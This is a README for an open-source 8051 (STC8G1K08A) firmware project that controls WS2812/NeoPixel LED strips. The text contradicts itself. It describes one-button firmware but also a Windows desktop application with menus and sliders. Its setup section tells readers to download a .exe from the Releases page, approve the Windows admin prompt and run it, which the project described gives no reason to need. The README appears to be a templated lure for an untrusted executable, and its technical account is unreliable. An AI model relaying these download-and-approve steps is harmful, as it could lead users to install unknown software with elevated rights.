# 💡 LongXL-LED-Open-Source-Version - Simple Control For Addressable LED Lights

[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Leomonc9813/LongXL-LED-Open-Source-Version)

This software manages WS2812 and NeoPixel LED strips using a simple one-button interface. It runs on the STC8G1K08A controller. The system features seven preset colors and a brightness adjustment tool. It saves your settings in internal memory so the lights keep their state after a power cycle.

## 🛠 Features

* **One-Button Control:** Cycle through seven standard colors with a single click.
* **Brightness Adjustment:** Press and hold the button to ramp the brightness up or down.
* **Persistent Memory:** The device remembers your last color and brightness selection.
* **Efficient Power Use:** The controller operates on low voltage to minimize heat.
* **Open Format:** The code remains accessible for anyone who wants to study or change it.

## 📋 System Requirements

To use this software, your computer must meet these basic criteria:

* **Operating System:** Windows 10 or Windows 11.
* **Processor:** Any modern 1GHz processor or faster.
* **Memory:** At least 2GB of RAM.
* **Storage:** 50MB of available disk space for the setup files.
* **Hardware Connection:** A standard USB-to-TTL serial adapter to connect the controller to your computer.

## ⬇️ Setup and Installation

Follow these steps to get the software running on your Windows machine.

1. **Visit the Download Page:** You must download the latest release files from the repository repository page. Visit this page to download: [https://github.com/Leomonc9813/LongXL-LED-Open-Source-Version](https://github.com/Leomonc9813/LongXL-LED-Open-Source-Version).
2. **Locate the Installer:** Once the page opens, look for the "Releases" section on the right side of the screen. Click on the most recent version number.
3. **Download the File:** Find the file ending in `.exe` within the release assets. Click the filename to save it to your computer.
4. **Run the Installer:** Navigate to your Downloads folder and double-click the file you just saved. 
5. **Approve Security:** Windows might show a prompt asking if you allow the app to make changes. Click "Yes" to confirm the installation.
6. **Follow Prompts:** The installer window opens. Read the instructions and click "Next" through the setup process. 
7. **Complete:** The software creates a desktop shortcut once finished. Click "Finish" to exit the installer.

## 🔌 Connecting Your Hardware

After you install the software, you must link your computer to the LED controller.

1. Plug your USB-to-TTL adapter into a free USB port on your computer.
2. Connect the wires from the adapter to the pins on the STC8G1K08A controller. Match the labels carefully: TX to RX, RX to TX, and Ground to Ground.
3. Open the LongXL application from your desktop. 
4. The application detects the connection automatically. If it does not, click the "Settings" menu inside the program and select your COM port from the list.

## ⚙️ Using the Interface

The interface provides a clear view of your current LED settings. 

* **Color Selection:** Use the drop-down menu to pick one of the seven colors. The software sends a signal to your strips immediately.
* **Brightness Slider:** Move the slider to change the intensity of your lights. The software records the new brightness level to the EEPROM memory right away.
* **Reset Button:** Use this button to return the controller to factory settings. This clears the memory and restores the default startup color.

## 🔍 Troubleshooting Common Issues

* **Software does not open:** Verify that you have the latest version of the .NET framework installed on your computer.
* **No signal to LEDs:** Check the connection between your USB adapter and the controller. Ensure the wires are tight and connected to the correct pins.
* **Software shows a connection error:** Unplug the USB adapter, wait five seconds, and plug it back in. Select the new COM port number inside the application settings.
* **Lights blink randomly:** This indicates a power issue. Ensure the LED strip has a dedicated power supply that is strong enough for the length of your lights.

## 💡 Technical Notes

The system uses bit-banging techniques to maintain the 800kHz data rate required for addressable LEDs. The software operates at a clock speed of 35MHz to ensure the timing remains precise. All source files utilize the SDCC compiler. Experienced developers can compile the project using Keil C51 to tweak the pulse width modulation for custom hardware layouts.

Keywords: 8051, addressable-led, keil-c51, led-controller, mcs-51, neopixel, sdcc, stc8, stc8g, ws2812